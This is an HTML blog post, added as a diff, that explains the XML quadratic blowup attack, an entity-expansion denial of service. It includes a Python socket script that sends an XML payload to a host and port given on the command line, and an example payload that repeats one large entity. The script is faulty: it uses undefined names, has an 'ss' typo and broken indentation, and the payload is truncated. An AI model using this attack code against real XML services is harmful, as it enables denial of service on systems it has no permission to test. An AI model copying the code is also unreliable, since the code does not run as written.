@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+	<meta charset="utf-8">
+	<meta name="description" content=''>
+	<meta name="keywords" content=''>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href='https://www.vishalmishra.in/css/bootstrap.min.css'>
+	<title>Quadratic Blowup Attack</title>
+	<nav class="navbar text-center sticky-top bg-white mt-2 mb-1">
+		<a href='https://www.vishalmishra.in/'><span class="btn btn-sm btn-outline-primary">Home</span></a>
+		<a href='https://www.vishalmishra.in/about'><span class="btn btn-sm btn-outline-secondary">About</span></a>
+		<a href='https://www.vishalmishra.in/post'><span class="btn btn-sm btn-outline-success">Blog</span></a>
+		<a href='https://www.vishalmishra.in/tags'><span class="btn btn-sm btn-outline-warning">Tags</span></a>
+	</nav>
+</head>
+<body>
+      <div id="content">
+
+
+	<section class="container text-monospace text-justified mt-3">
+	  <h2>Quadratic Blowup Attack</h2>
+	  <small class="text-secondary mb-5">Posted on December 4, 2017 | 2 minute read</small>
+	  <p><h2 id="attack">Attack</h2>
+<p>An XML quadratic blowup attack is similar to a Billion Laughs attack. Essentially, it exploits the use of entity expansion. Instead of deferring to the use of nested entities, it replicates one large entity using a couple thousand characters repeatedly.
+These attacks exists becasue applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. These adverse effects may include the parser crashing, consuming too much of a resource, executing too slowly, executing code supplied by an attacker, allowing usage of unintended system functionality, etc.</p>
+<h2 id="script">Script</h2>
+<p>The following code can be used to send the payload to vulnerable application. For adding the SSL/TLS support import SSL lib and encapsulate plain socket in ssl socket using ssl.wrap_socket function(plainSocketHandle, ssl_version=&rdquo;&quot;).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>ssl
+
+<span style="color:#75715e">###########Code Snippet###########</span>
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+addr <span style="color:#f92672">=</span> (sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]))
+    <span style="color:#66d9ef">try</span>:
+        s<span style="color:#f92672">.</span>connect(addr)
+        data <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">GET /rest/version HTTP/1.0</span><span style="color:#ae81ff">\r</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Content-Type: application/xml</span><span style="color:#ae81ff">\r</span><span style="color:#ae81ff">\n</span><span style="color:#ae81ff">\r</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> exploit_PayloadGen()
+        s<span style="color:#f92672">.</span>send(data)
+        resp <span style="color:#f92672">=</span> ss<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1000</span>)
+        s<span style="color:#f92672">.</span>close()
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Attack Failed!!</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">except</span>:
+        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+        <span style="color:#66d9ef">if</span> status <span style="color:#f92672">==</span> True:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Attack Successful. XML application pawned!!!</span><span style="color:#e6db74">&#34;</span>)
+            status<span style="color:#f92672">=</span>False
+<span style="color:#75715e">###################################</span>
+</code></pre></div><h4 id="payload">Payload</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-XML" data-lang="XML"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span><span style="color:#75715e">&lt;!DOCTYPE payload [
+</span><span style="color:#75715e">&lt;!ENTITY Aloo &#34;AAAAAAAAAAAAAAAAAAA...&#34;&gt;</span>
+]&gt;
+<span style="color:#f92672">&lt;payload</span><span style="color:#f92672">&gt;</span>&amp;Aloo;&amp;Aloo;&amp;Aloo;&amp;Aloo;&amp;Aloo;&amp;Aloo;...<span style="color:#f92672">&lt;/payload&gt;</span>
+
+</code></pre></div><p>While forming payload the application XML schema plays a very important role. In order to automate the payload generation XSD files can be used to generate payload in proper schema structure which application under radar understands.</p>
+<h2 id="exploit">Exploit</h2>
+<p><img src="https://www.vishalmishra.in/media/XMLExpquadratic.gif" alt=" Quadratic Blowup Attack GIF"></p>
+<h5 id="references"><strong>References</strong>:</h5>
+<ol>
+<li><a href="http://capec.mitre.org/data/definitions/99.html">XML Attacks</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion Day Laugh</a></li>
+<li><a href="https://github.com/s4bu">GitHub</a></li>
+</ol>
+</p>
+	  <code>tags:<span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/web%20attack'>Web Attack</a></span>
+	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/python'>Python</a></span>
+	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/exploit'>Exploit</a></span>
+	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/hack'>Hack</a></span>
+	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/web%20exploit'>Web Exploit</a></span>
+	  
+	  </code>
+	  <div class="container mt-2" id="comments">
+	    
+		<small class="mt-1">Please mail your comments to <a href="vishal_mishra@live.com">vishal_mishra@live.com</a></small><br>
+	    
+	  </div>
+	</section>
+
+
+
+      </div>
+  </body><footer>
+  <div class="container-fluid bg-dark text-white text-monospace text-center mt-4">
+    <small> | Powered by <a href="https://gohugo.io">Hugo</a></small>
+  </div>
+  
+</footer>
+</html>
